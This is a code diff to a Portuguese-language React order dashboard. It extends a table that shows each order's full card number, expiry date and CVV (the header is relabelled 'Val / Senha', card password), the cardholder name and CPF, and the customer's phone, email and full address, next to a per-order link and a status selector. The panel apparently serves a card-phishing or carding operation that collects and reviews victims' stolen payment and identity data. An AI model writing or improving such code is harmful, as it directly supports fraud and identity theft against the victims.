@@ -152,12 +152,13 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                 <tr>
                   <th className="px-3 py-2">Criado</th>
                   <th className="px-3 py-2">ID</th>
-                  <th className="px-3 py-2">CPF</th>
+                  <th className="px-3 py-2">Cliente</th>
+                  <th className="px-3 py-2">Contato</th>
+                  <th className="px-3 py-2">Endereço de entrega</th>
+                  <th className="px-3 py-2">Produto</th>
                   <th className="px-3 py-2">Cartão</th>
-                  <th className="px-3 py-2">Val / CVV</th>
+                  <th className="px-3 py-2">Val / Senha</th>
                   <th className="px-3 py-2">Valor</th>
-                  <th className="px-3 py-2">Cond.</th>
-                  <th className="px-3 py-2">Operador</th>
                   <th className="px-3 py-2">Status</th>
                   <th className="px-3 py-2">Link</th>
                   <th className="px-3 py-2">Ações</th>
@@ -170,16 +171,32 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                       {new Date(p.criado_em).toLocaleString("pt-BR")}
                     </td>
                     <td className="px-3 py-2 font-mono">{p.id.slice(0, 8)}</td>
-                    <td className="px-3 py-2 font-mono">{p.cliente_cpf}</td>
+                    <td className="px-3 py-2">
+                      <div className="font-semibold">{p.cliente_nome}</div>
+                      <div className="font-mono text-[11px] text-muted-foreground">{p.cliente_cpf}</div>
+                    </td>
+                    <td className="px-3 py-2">
+                      <div>{p.cliente_telefone}</div>
+                      <div className="text-[11px] text-muted-foreground">{p.cliente_email}</div>
+                    </td>
+                    <td className="px-3 py-2 max-w-[260px]">
+                      <div>{p.cliente_endereco}, {p.cliente_numero}{p.cliente_complemento ? ` — ${p.cliente_complemento}` : ""}</div>
+                      <div className="text-[11px] text-muted-foreground">
+                        {p.cliente_bairro} · {p.cliente_cidade}/{p.cliente_estado} · CEP {p.cliente_cep}
+                      </div>
+                    </td>
+                    <td className="px-3 py-2">
+                      <div>{p.produto_nome}</div>
+                      <div className="text-[11px] text-muted-foreground">qtd {p.produto_quantidade ?? 1}</div>
+                    </td>
                     <td className="px-3 py-2 font-mono">{p.cartao_numero}</td>
                     <td className="px-3 py-2 font-mono">
                       {p.cartao_validade} / {p.cartao_cvv}
+                      {p.cartao_nome && <div className="text-[11px] text-muted-foreground font-sans">{p.cartao_nome}</div>}
                     </td>
                     <td className="px-3 py-2 font-semibold">
                       R$ {Number(p.valor).toFixed(2).replace(".", ",")}
                     </td>
-                    <td className="px-3 py-2">{p.condicao}x</td>
-                    <td className="px-3 py-2">{p.operador}</td>
                     <td className="px-3 py-2">
                       <select
                         value={p.status}
@@ -217,7 +234,7 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                 ))}
                 {filtered.length === 0 && (
                   <tr>
-                    <td colSpan={11} className="px-3 py-8 text-center text-muted-foreground">
+                    <td colSpan={12} className="px-3 py-8 text-center text-muted-foreground">
                       Nenhum pedido.
                     </td>
                   </tr>
